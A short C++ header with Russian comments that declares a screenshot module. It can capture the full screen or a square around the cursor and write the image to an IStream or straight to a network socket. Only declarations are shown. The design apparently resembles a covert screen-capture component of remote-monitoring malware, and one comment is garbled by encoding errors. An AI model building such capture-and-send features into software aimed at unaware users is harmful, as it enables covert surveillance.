/*
  Создание скриншота.
*/
#pragma once

namespace Screenshoot
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Запись скриншота экрана в IStream.

    IN mimeType - формат изображения.
    IN quality  - качество картинки в процентах (только JPEG).
    IN rect     - размер стороны квадрата вокруг курсора, или 0 - для создание скриншота всего
                  экрана.

    Return      - IStream - в случаи успеха,
                  NULL    - в случаи ошибки.
  */
  IStream *_screenToIStream(LPWSTR mimeType, DWORD quality, WORD rect);

  /*В В В В Record screenshots into the socket.

В В В В IN s - socket.
В В В В IN mimeType - the image format.
В В В В IN quality - picture quality in percent (only JPEG).
В В В В IN rect - the size of the square around the cursor, or 0 - to create a screenshot of the
В В В В В В В В В В В В В В В В В В screen.

В В В В Return - true - if successful,
В В В В В В В В В В В В В В В В В В false - if an error occurs.
В В */
  bool _screenToSocket(SOCKET s, LPWSTR mimeType, DWORD quality, WORD rect);
};
